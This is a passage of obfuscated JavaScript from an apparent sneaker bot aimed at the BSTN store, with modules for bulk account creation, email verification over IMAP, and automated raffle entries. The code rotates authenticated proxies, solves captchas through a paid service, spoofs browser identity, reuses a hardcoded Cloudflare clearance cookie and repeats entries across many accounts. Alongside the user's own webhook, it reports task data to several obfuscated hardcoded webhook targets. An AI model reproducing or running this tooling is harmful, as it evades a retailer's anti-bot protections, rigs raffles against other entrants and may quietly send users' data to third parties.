                        console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20' + _0xec6c95)), _0x95a13f = '' + _0xec6c95;
                        var _0x2e366b = await _0x5c5001(_0x266aa3[_0x5d6369], _0x47627e, 'dev', !![], _0x95a13f);
                        _0x41253f['errorDEV'] = { 'embeds': [_0x2e366b] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x41253f['errorDEV']), await _0x4160b0(_0x3ce78e, _0x41253f['errorDEV']), _0x3ff5f9 = 'yes';
                    } finally {
                        _0xdc633 && _0xdc633['close']();
                        if (_0x3ff5f9 == 'yes' && _0x1836ce != 0x5 && _0x95a13f != 'Size\x20Not\x20Found') {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1836ce + '\x20/\x205)')), _0x5d6369 = _0x5d6369 - 0x1, _0x1836ce = _0x1836ce + 0x1;
                            continue;
                        }
                        _0x3ff5f9 == 'yes' && _0x1836ce >= 0x5 && (_0x17fcb0(_0x266aa3[_0x5d6369], _0x47627e), _0x3ff5f9 = 'no', _0x1836ce = 0x0);
                        if (_0x5d6369 + 0x1 == _0x266aa3['length']) {
                            await _0x37731a(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x15bf3f['AfewDelay'] + '\x20ms'), await _0x37731a(_0x15bf3f['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x47d11f, _0x22085c, _0x40a47c) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1498f4 = 0x0; _0x1498f4 < _0x22085c['length']; _0x1498f4++) {
                        if (_0x1ecd2b != 'yes')
                            var _0x1ecd2b = '', _0x829b28 = 0x0;
                        var _0x16fff4;
                        try {
                            await _0x412246(_0x22085c, _0x1498f4);
                        } catch {
                            _0x1ecd2b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x57fa03(_0x47d11f['name'] + '\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20/\x20' + _0x22085c['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        var _0x2d2560 = await _0x5c5001(_0x22085c[_0x1498f4], _0x47d11f, 'acc', ![]);
                        const _0x38d138 = { 'succesDEVMSG': { 'embeds': [_0x2d2560] } }, _0x2693a6 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x2b1b7d = Math['round'](Math['random']() * (_0x40a47c['length'] - 0x1)), _0x4c603c = _0x40a47c[_0x2b1b7d]['split'](':');
                        const _0xe29513 = await _0x3df2da['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4c603c[0x0] + ':' + _0x4c603c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x4d69d6 = await _0xe29513['newPage']();
                            await _0x4d69d6['authenticate']({
                                'username': '' + _0x4c603c[0x2],
                                'password': '' + _0x4c603c[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4d69d6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4d69d6['setRequestInterception'](!![]), _0x4d69d6['on']('request', _0x40afa4 => {
                                _0x40afa4['resourceType']() === 'image' ? _0x40afa4['abort']() : _0x40afa4['continue']();
                            });
                            try {
                                await _0x4d69d6['goto']('' + _0x2693a6), await _0x4d69d6['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x4d69d6['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x37731a(0x7d0), console['log'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x37731a(0x190), await _0x4d69d6['waitForSelector']('#firstname'), await _0x4d69d6['type']('#firstname', _0x22085c[_0x1498f4]['FirstName'], { 'delay': 0xf0 }), await _0x37731a(0x190), await _0x4d69d6['type']('#lastname', _0x22085c[_0x1498f4]['LastName'], { 'delay': 0xe6 }), await _0x37731a(0x190), await _0x4d69d6['type']('#email_address', _0x22085c[_0x1498f4]['Email'], { 'delay': 0x122 }), await _0x37731a(0x190), await _0x4d69d6['type']('#password', _0x22085c[_0x1498f4]['Password'], { 'delay': 0x82 }), await _0x37731a(0x1f4), await _0x4d69d6['type']('#password-confirmation', _0x22085c[_0x1498f4]['Password'], { 'delay': 0x7c }), console['log'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x37731a(0x2bc), await _0x4d69d6['$eval']('#form-validate', _0x222057 => _0x222057['submit']()), await _0x37731a(0x1388);
                            const _0x8f3c4c = await _0x4d69d6['$']('#email_address-error');
                            if (_0x8f3c4c)
                                throw new Error('Invalid\x20Email');
                            const _0xabd0b4 = await _0x4d69d6['$']('#password-error');
                            if (_0xabd0b4)
                                throw new Error('Invalid\x20Password');
                            await _0x4d69d6['waitForSelector']('div.mesg-success'), _0x1ecd2b = 'no', console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20Account\x20' + _0x22085c[_0x1498f4]['Email'] + '\x20Generated')), _0x241ca2['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x22085c[_0x1498f4]['Email'] + ',' + _0x22085c[_0x1498f4]['Password']);
                            try {
                                _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x38d138['succesDEVMSG']);
                            } catch {
                            }
                            await _0x4160b0(_0x14c79a, _0x38d138['succesDEVMSG']), console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x1a7052) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20' + _0x1a7052)), _0x16fff4 = '' + _0x1a7052;
                            var _0x1ac124 = await _0x5c5001(_0x22085c[_0x1498f4], _0x47d11f, 'acc', !![], _0x16fff4);
                            _0x38d138['errorDEV'] = { 'embeds': [_0x1ac124] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x38d138['errorDEV']), await _0x4160b0(_0x3ce78e, _0x38d138['errorDEV']), _0x1ecd2b = 'yes';
                        } finally {
                            _0xe29513['close']();
                            if (_0x1ecd2b == 'yes' && _0x829b28 != 0x5) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Task\x20' + (_0x1498f4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x829b28 + '\x20/\x205)')), _0x1498f4 = _0x1498f4 - 0x1, _0x829b28 = _0x829b28 + 0x1;
                                continue;
                            }
                            _0x1ecd2b == 'yes' && _0x829b28 >= 0x5 && (_0x17fcb0(_0x22085c[_0x1498f4], _0x47d11f), _0x1ecd2b = 'no', _0x829b28 = 0x0), console['log'](_0x1c7496() + '\x20[' + _0x47d11f['name'] + ']\x20Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x326793, _0x4900f8) {
                    var _0x2315a1 = ![], _0x15d830 = [];
                    async function _0x3977e1() {
                        var _0x48129b = new _0x3451ed({
                            'user': _0x15bf3f['masterMail'],
                            'password': _0x15bf3f['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x259787(_0x2c6f7c) {
                            _0x48129b['openBox']('INBOX', ![], _0x2c6f7c);
                        }
                        _0x48129b['once']('ready', function () {
                            _0x259787(function (_0x336fdb, _0x2eb6cd) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x336fdb)
                                    throw _0x336fdb;
                                _0x48129b['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x3c6d1d, _0x1add8e) {
                                    if (!_0x1add8e || !_0x1add8e['length'])
                                        console['log'](_0x1c7496() + '\x20[' + _0x326793['name'] + ']\x20No\x20mails\x20found'), _0x48129b['end']();
                                    else {
                                        var _0x3bce1f = _0x48129b['seq']['fetch'](_0x1add8e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3bce1f['on']('message', function (_0x325166, _0x24f637) {
                                            var _0x3ab66a = '(#' + _0x24f637 + ')\x20';
                                            _0x325166['on']('body', function (_0x35d9ff, _0x344818) {
                                                _0x34a37a(_0x35d9ff, (_0x64a1be, _0x4e70ab) => {
                                                    var _0x136dc8 = _0x4e70ab['text']['split']('[')[0x2], _0x383f6e = _0x136dc8['split'](']')[0x0];
                                                    _0x15d830['push'](_0x383f6e);
                                                });
                                            }), _0x325166['once']('end', function () {
                                            });
                                        }), _0x3bce1f['once']('error', function (_0x39f77c) {
                                            console['log']('Fetch\x20error:\x20' + _0x39f77c), _0x2315a1 = !![];
                                        }), _0x3bce1f['once']('end', function () {
                                            _0x48129b['end'](), _0x2315a1 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x48129b['once']('error', function (_0x882da6) {
                            console['log'](_0x7ff36['red'](_0x882da6['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2315a1 = !![];
                        }), _0x48129b['once']('end', async function () {
                            _0x2315a1 = !![];
                        }), _0x48129b['connect']();
                    }
                    async function _0x7ecd65(_0xfa5950, _0x1e9a14, _0xcd9717) {
                        _0x3df2da['use'](_0x6b6409());
                        for (var _0x3fd534 = 0x0; _0x3fd534 < _0x1e9a14['length']; _0x3fd534++) {
                            if (_0x1742a9 != 'yes')
                                var _0x1742a9 = '', _0x2473fd = 0x0;
                            var _0xa7c074 = Math['round'](Math['random']() * (_0xcd9717['length'] - 0x1)), _0x3b5925 = _0xcd9717[_0xa7c074]['split'](':');
                            const _0x24e860 = await _0x3df2da['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3b5925[0x0] + ':' + _0x3b5925[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x205779 = await _0x24e860['newPage']();
                                await _0x205779['authenticate']({
                                    'username': '' + _0x3b5925[0x2],
                                    'password': '' + _0x3b5925[0x3]
                                }), console['log'](_0x1c7496() + '\x20[' + _0xfa5950['name'] + ']\x20Task\x20' + (_0x3fd534 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x205779['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x205779['setRequestInterception'](!![]), _0x205779['on']('request', _0x2fa362 => {
                                    _0x2fa362['resourceType']() === 'image' || _0x2fa362['resourceType']() === 'font' || _0x2fa362['resourceType']() === 'media' ? _0x2fa362['abort']() : _0x2fa362['continue']();
                                }), console['log'](_0x1c7496() + '\x20[' + _0xfa5950['name'] + ']\x20Task\x20' + (_0x3fd534 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x205779['goto'](_0x1e9a14[_0x3fd534]), console['log'](_0x1c7496() + '\x20[' + _0xfa5950['name'] + ']\x20Task\x20' + (_0x3fd534 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x205779['waitForTimeout'](0xbb8);
                                try {
                                    await _0x205779['waitForSelector']('.account-nav'), _0x1742a9 = 'no', console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0xfa5950['name'] + ']\x20Task\x20' + (_0x3fd534 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x14013a = await _0x5c5001(null, _0xfa5950, 'ver', ![]);
                                    const _0x526a9d = { 'succesDEVMSG': { 'embeds': [_0x14013a] } };
                                    await _0x4160b0(_0x378e8b, _0x526a9d['succesDEVMSG']);
                                } catch (_0x3ecc41) {
                                    throw new Error(_0x3ecc41);
                                }
                            } catch (_0x228bc7) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0xfa5950['name'] + ']\x20Task\x20' + (_0x3fd534 + 0x1) + '\x20:\x20' + _0x228bc7));
                                var _0x386123 = _0x228bc7, _0x9c1b6 = await _0x5c5001(null, _0xfa5950, 'ver', !![], _0x386123);
                                const _0xc8d6ef = { 'errorDEVMSG': { 'embeds': [_0x9c1b6] } };
                                _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0xc8d6ef['errorDEVMSG']), await _0x4160b0(_0x3ce78e, _0xc8d6ef['errorDEVMSG']), _0x1742a9 = 'yes';
                            } finally {
                                _0x24e860['close']();
                                if (_0x1742a9 == 'yes' && _0x2473fd != 0x5) {
                                    console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0xfa5950['name'] + ']\x20Task\x20' + (_0x3fd534 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2473fd + '\x20/\x205)')), _0x3fd534 = _0x3fd534 - 0x1, _0x2473fd = _0x2473fd + 0x1;
                                    continue;
                                }
                                _0x1742a9 == 'yes' && _0x2473fd >= 0x5 && (_0x1742a9 = 'no', _0x2473fd = 0x0), console['log'](_0x1c7496() + '\x20[' + _0xfa5950['name'] + ']\x20Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                            }
                        }
                    }
                    try {
                        _0x3977e1();
                        while (!_0x2315a1) {
                            await _0x37731a(0xfa0);
                        }
                        console['log']('Found\x20' + _0x15d830['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x37731a(0x7d0);
                    }
                    await _0x7ecd65(_0x326793, _0x15d830, _0x4900f8);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1309f7, _0x18febf, _0x541253) {
                    _0x3df2da['use'](_0x6b6409()), _0x3df2da['use'](_0x371b3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x15bf3f['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x50e084 = 0x0; _0x50e084 < _0x18febf['length']; _0x50e084++) {
                        var _0x158b85;
                        try {
                            await _0x412246(_0x18febf, _0x50e084);
                        } catch {
                            _0x174aff = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0xede12d(_0x17f330) {
                            const _0xbc6491 = _0x241ca2['readFileSync']('../successful-tasks.csv', 'utf8'), _0x487c92 = _0x34efb8['parse'](_0xbc6491, { 'header': !![] })['data'];
                            let _0x485cdb = ![];
                            for (var _0x3103b3 of _0x487c92) {
                                if (_0x3103b3['Url'] == _0x17f330['Url'] && _0x3103b3['Email'] == _0x17f330['Email']) {
                                    _0x485cdb = !![];
                                    break;
                                }
                            }
                            return _0x485cdb;
                        }
                        if (await _0xede12d(_0x18febf[_0x50e084]) == !![]) {
                            console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x174aff != 'yes')
                            var _0x174aff = '', _0xa6187f = 0x0;
                        _0x57fa03(_0x1309f7['name'] + '\x20Task\x20' + (_0x50e084 + 0x1) + '\x20/\x20' + _0x18febf['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        var _0x1a69fe = Math['round'](Math['random']() * (_0x541253['length'] - 0x1)), _0x5013ea = _0x541253[_0x1a69fe]['split'](':'), _0x365ec0;
                        try {
                            _0x365ec0 = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5013ea[0x0] + ':' + _0x5013ea[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x365ec0 = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5013ea[0x0] + ':' + _0x5013ea[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x72f0b9 = await _0x365ec0['newPage'](), _0xf5d2d7 = await _0x72f0b9['target']()['createCDPSession'](), { windowId: _0x5cc1d0 } = await _0xf5d2d7['send']('Browser.getWindowForTarget');
                            await _0x72f0b9['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x5ed8c7 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x72f0b9['authenticate']({
                                'username': '' + _0x5013ea[0x2],
                                'password': '' + _0x5013ea[0x3]
                            }), console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x72f0b9['goto']('' + _0x18febf[_0x50e084]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                await _0x72f0b9['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0xf5d2d7['send']('Browser.setWindowBounds', {
                                'windowId': _0x5cc1d0,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x37731a(0x1388), await _0x72f0b9['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x72f0b9['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x37731a(0x1f4), console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Logging\x20in'), await _0x72f0b9['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0xceea83 => _0xceea83['click']()), await _0x72f0b9['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x72f0b9['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x37731a(0x7d0), await _0x72f0b9['waitForSelector']('#email-login'), await _0x72f0b9['type']('#email-login', '' + _0x18febf[_0x50e084]['Email']), await _0x37731a(0xdac), await _0x72f0b9['waitForSelector']('#password'), await _0x72f0b9['type']('#password', '' + _0x18febf[_0x50e084]['Password'], { 'delay': 0xe6 }), await _0x37731a(0x157c);
                            try {
                                await _0x72f0b9['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x671486 => _0x671486['click']());
                            } catch {
                            }
                            try {
                                await _0x72f0b9['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x25b237) {
                            }
                            await _0x37731a(0x3e8);
                            const _0x1592fa = await _0x72f0b9['$']('.enteredDraw_container__2KmQ_');
                            if (_0x1592fa)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x18febf[_0x50e084]['Size']);
                            try {
                                if (_0x18febf[_0x50e084]['Size'] != 'RANDOM') {
                                    var _0x53136b = _0x18febf[_0x50e084]['Size']['replace']('.', ',');
                                    const _0x293b25 = await _0x72f0b9['$x']('//div[contains(text(),\x20' + _0x53136b + ')]');
                                    await _0x293b25[0x0]['click']();
                                } else {
                                    const _0x3f37f2 = await _0x72f0b9['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x2e9933 = Math['round'](Math['random']() * (_0x3f37f2['length'] - 0x1));
                                    await _0x3f37f2[_0x2e9933]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x37731a(0x1f4);
                            const _0x42efd6 = await _0x72f0b9['$']('.addressList_addressItem__LE2PB');
                            if (_0x42efd6 && _0x18febf[_0x50e084]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x72f0b9['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x37731a(0x5dc), await _0x72f0b9['waitForSelector']('#firstname'), await _0x72f0b9['type']('#firstname', '' + _0x18febf[_0x50e084]['FirstName']), await _0x37731a(0x1f4), await _0x72f0b9['waitForSelector']('#firstname'), await _0x72f0b9['type']('#lastname', '' + _0x18febf[_0x50e084]['LastName']), await _0x37731a(0x1f4), await _0x72f0b9['waitForSelector']('#firstname'), await _0x72f0b9['type']('#street', '' + _0x18febf[_0x50e084]['Address1']), await _0x37731a(0x1f4), await _0x72f0b9['waitForSelector']('#firstname'), await _0x72f0b9['type']('#houseNumber', _0x18febf[_0x50e084]['HouseNumber'] + '\x20' + _0x18febf[_0x50e084]['Address2']), await _0x37731a(0x1f4), await _0x72f0b9['waitForSelector']('#firstname'), await _0x72f0b9['select']('#country_code', '' + _0x18febf[_0x50e084]['Country']), await _0x37731a(0x1f4), await _0x72f0b9['type']('#postcode', '' + _0x18febf[_0x50e084]['Zip']), await _0x37731a(0x1f4), await _0x72f0b9['type']('#city', '' + _0x18febf[_0x50e084]['City']), await _0x37731a(0x1f4), await _0x72f0b9['type']('#telephone', '' + _0x18febf[_0x50e084]['Phone']), await _0x37731a(0x1f4), await _0x72f0b9['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x37731a(0x9c4);
                            try {
                                await _0x72f0b9['type']('#instagram_name', '' + _0x18febf[_0x50e084]['Follower']), await _0x72f0b9['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x37731a(0x5dc);
                            try {
                                await _0x72f0b9['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x37731a(0x5dc), await _0x72f0b9['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x15501c => _0x15501c['click']()), await _0x37731a(0x1388);
                            try {
                                await _0x72f0b9['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x72f0b9['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x18febf[_0x50e084]['Size'] != 'RANDOM') {
                                    var _0x53136b = _0x18febf[_0x50e084]['Size']['replace']('.', ',');
                                    const _0x3c92ea = await _0x72f0b9['$x']('//div[contains(text(),\x20' + _0x53136b + ')]');
                                    await _0x3c92ea[0x0]['click']();
                                } else {
                                    const _0x45524b = await _0x72f0b9['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x2e9933 = Math['round'](Math['random']() * (_0x45524b['length'] - 0x1));
                                    await _0x45524b[_0x2e9933]['click']();
                                }
                                await _0x37731a(0x5dc);
                                try {
                                    await _0x72f0b9['hover']('#instagram_name'), await _0x72f0b9['type']('#instagram_name', '' + _0x18febf[_0x50e084]['Follower']), await _0x72f0b9['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Retrying\x20(' + _0xa6187f + '\x20/\x205)'), await _0x72f0b9['hover']('.checkBox_boxHolder__wLGVe'), await _0x37731a(0x5dc), await _0x72f0b9['click']('.checkBox_boxHolder__wLGVe'), await _0x37731a(0x157c), await _0x72f0b9['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x25dfbd => _0x25dfbd['click']()), await _0x37731a(0x1388), await _0x72f0b9['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x174aff = 'no', _0x5879e0(_0x18febf[_0x50e084], _0x1309f7), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x53c2d1 = await _0x5c5001(_0x18febf[_0x50e084], _0x1309f7, 'dev', ![]), _0x5c4f1f = await _0x5c5001(_0x18febf[_0x50e084], _0x1309f7, 'pub', ![]);
                            const _0x5c8dd7 = {
                                'succesDEVMSG': { 'embeds': [_0x53c2d1] },
                                'succesPUBMSG': { 'embeds': [_0x5c4f1f] }
                            };
                            try {
                                _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x5c8dd7['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x5c8dd7['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0xd6338c, _0x5c8dd7['succesPUBMSG']);
                            } catch (_0x5c6ce3) {
                                console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5c6ce3));
                            }
                        } catch (_0x13f1c3) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20' + _0x13f1c3)), _0x174aff = 'yes', _0x158b85 = '' + _0x13f1c3;
                            var _0x5d590f = await _0x5c5001(_0x18febf[_0x50e084], _0x1309f7, 'dev', !![], _0x158b85), _0x53c2d1 = await _0x5c5001(_0x18febf[_0x50e084], _0x1309f7, 'dev', ![]), _0x5c4f1f = await _0x5c5001(_0x18febf[_0x50e084], _0x1309f7, 'pub', ![]);
                            const _0x114935 = {
                                'succesDEVMSG': { 'embeds': [_0x53c2d1] },
                                'succesPUBMSG': { 'embeds': [_0x5c4f1f] }
                            };
                            _0x114935['errorDEV'] = { 'embeds': [_0x5d590f] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x114935['errorDEV']), await _0x4160b0(_0x3ce78e, _0x114935['errorDEV']);
                        } finally {
                            _0x365ec0['close']();
                            if (_0x174aff == 'yes' && _0xa6187f != 0x5) {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x1309f7['name'] + ']\x20Task\x20' + (_0x50e084 + 0x1) + '\x20:\x20Retrying\x20(' + _0xa6187f + '\x20/\x205)')), _0x50e084 = _0x50e084 - 0x1, _0xa6187f = _0xa6187f + 0x1;
                                continue;
                            }
